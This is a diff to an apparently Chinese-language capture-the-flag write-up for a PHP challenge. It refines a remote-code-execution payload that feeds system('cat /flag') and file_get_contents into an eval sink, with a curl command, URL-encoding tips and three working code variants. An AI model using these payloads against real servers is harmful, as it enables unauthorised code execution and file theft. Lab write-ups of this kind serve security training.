@@ -62,7 +62,7 @@ if (
 ## 二、最终 payload
 
 ```
-POST /?year=1e5&purpose=rce&code=system('cat%20/flag');
+POST /?year=1e5&purpose=rce&code=system(%27cat%20/flag%27)%3B
 Content-Type: application/x-www-form-urlencoded
 
 start=start%20now&_[2024.geekchallenge.ctf=aaroZmOk
@@ -70,7 +70,7 @@ start=start%20now&_[2024.geekchallenge.ctf=aaroZmOk
 
 ```bash
 curl -s -X POST \
-  "http://<host>/?year=1e5&purpose=rce&code=system('cat%20/flag');" \
+  "http://<host>/?year=1e5&purpose=rce&code=system(%27cat%20/flag%27)%3B" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   --data-raw "start=start%20now&_[2024.geekchallenge.ctf=aaroZmOk"
 ```
@@ -83,6 +83,58 @@ curl -s -X POST \
 | **请求体** | `start` / `__2024.geekchallenge.ctf` | 源码写的是 `$_POST[...]` |
 
 实测：只发 URL → 卡 `haven't started`；只发 body → 卡 `It is not enough`；分两次发 → 两次都失败（**请求之间没有共享状态**）。
+
+### 2.1 URL 编码要点（**照抄 payload 时必看**）
+
+`code` 参数的内容是 PHP 代码，里面有单引号、空格、分号 —— **这些字符在 URL 查询串里必须百分号编码**，否则参数会被截断。
+
+| 字符 | 写法 | 不编码的后果 |
+|---|---|---|
+| `'` 单引号 | `%27` | 多数工具拒绝或改写 |
+| **`;` 分号** | **`%3B`** | **`eval` 收到不完整语句 → 报错被 `error_reporting(0)` 吞掉 → 看着像"走到了却没输出"** |
+| 空格 | `%20` 或 `+` | 提前结束参数 |
+| `$` | `%24` | 某些环境被吞 |
+| **`[`** | **故意留原样，不编码** | 编了就触发不了 L2 的参数名解析怪癖 |
+
+**`code` 里的空格只编一次**：`cat%20/flag` → URL 解码一次变 `cat /flag`，正确。
+写成 `cat%2520/flag` 会解码成字面量 `%20`，shell 会去找名叫「%20」的文件，输出为空。
+
+**踩过的坑**：一字不差地照抄 `code=system('cat%20/flag');`（字面的 `'` 和 `;`）会**走到 L4 但没有任何输出** ——
+`eval` 收到的语句不完整，而 `error_reporting(0)` 把报错吞了，**表面上什么都看不出来**。
+
+**关于字面量分号的实测**（原始 socket 复现，排除客户端编码因素）：
+
+| `code` 值写法 | 结果 |
+|---|---|
+| `system('cat /flag')` 后跟 `%3B` | 出 flag |
+| `system('cat /flag')` 后跟 `%20%3F%3E`（` ?>`） | 出 flag |
+| `system('cat /flag')` 后跟**字面量 `;`** | **空输出** |
+
+补充观察：
+
+- 字面量分号**只在 `code` 参数内**出问题 —— 放在 `year` / `purpose` / 其他参数里都正常
+- 靶机自报 `arg_separator.input = &`，**分号不是 PHP 的 `$_GET` 分隔符**
+- 行为不完全自洽（`echo 1 ?>;` 能跑，`echo 1; ?>` 不能）
+
+**结论**：现象确凿（原始 socket 级复现），但**具体机制未定论** —— 在到达 PHP 之前的处理层（Apache 2.4.25 / 容器网关）做了什么，环境不可见，无法验证。
+**实践上不必纠结**：分号一律写 `%3B`，或用 `?>`（`%3F%3E`）收尾，两条都稳。
+
+**自查手法**：在 `code` 里回显参数，看服务端到底收到了什么。
+
+```bash
+# 让 code 打印 $purpose 自己
+?year=1e5&purpose=rce&code=var_dump(%24purpose)%3B
+# 输出 string(3) "rce"  -> 说明参数完整到达
+# 输出为空               -> 参数被截断或编码错了
+```
+
+### 2.2 三种可用的 code（任选，都实测出 flag）
+
+```
+code=system(%27cat%20/flag%27)%3B               最短
+code=system(%27cat</flag%27)%3B                 用重定向代替空格
+code=echo%20file_get_contents(%27/flag%27)%3B   不走 shell，最稳
+```
 
 ## 三、逐层拆解
 
@@ -296,6 +348,8 @@ find / -iname "*flag*"  -> /flag
 | 全塞进 body | `year`/`purpose` 读不到 | URL 归 URL、body 归 body |
 | 分两次请求发 | **PHP 每个请求独立，没有跨请求状态** | 必须一次带齐 |
 | 脚本打印"空输出" | 我自己拿 `Get the flag now!` 当分隔符切分，切完只剩空串 | 打原始响应定位 |
+| **照抄 payload 里的 `'` 和 `;`（没编码）** | **字面量分号让 `code` 参数失效** → `eval` 收到不完整语句 → 报错被 `error_reporting(0)` 吞掉 → **看着像"走到了但没输出"** | `'` → `%27`、`;` → `%3B`（或改用 `?>` 收尾）；用 `code=var_dump(%24purpose)%3B` 自查参数是否完整到达 |
+| 把 `code` 里的空格编成 `%2520` | 解码一次变字面量 `%20`，shell 去找名叫「%20」的文件 | 空格**只编一次**：`%20` 或 `+` |
 
 ## 六、可复用的知识点
 
